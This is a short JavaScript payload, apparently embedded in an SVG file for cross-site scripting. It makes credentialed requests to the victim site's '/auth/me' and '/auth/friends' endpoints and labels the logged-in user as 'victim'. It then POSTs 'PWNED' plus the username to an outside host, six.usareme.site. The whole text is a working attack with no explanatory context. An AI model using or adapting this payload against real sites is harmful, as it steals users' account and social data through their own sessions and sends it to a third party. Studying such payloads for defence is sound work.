svg.script:
var a=document.getElementById('a'),b=document.getElementById('b'),O=location.origin;
fetch(O+'/auth/me',{credentials:'include'}).then(r=>r.json()).then(async m=>{
  a.textContent='victim='+m.user+' origin='+location.origin;
  var f=await (await fetch(O+'/auth/friends',{credentials:'include'})).text();
  b.textContent='friends='+f.slice(0,120);
  fetch('https://six.usareme.site/api/confess',{method:'POST',headers:{'content-type':'text/plain'},body:'PWNED '+m.user});
}).catch(e=>b.textContent='ERR '+e);
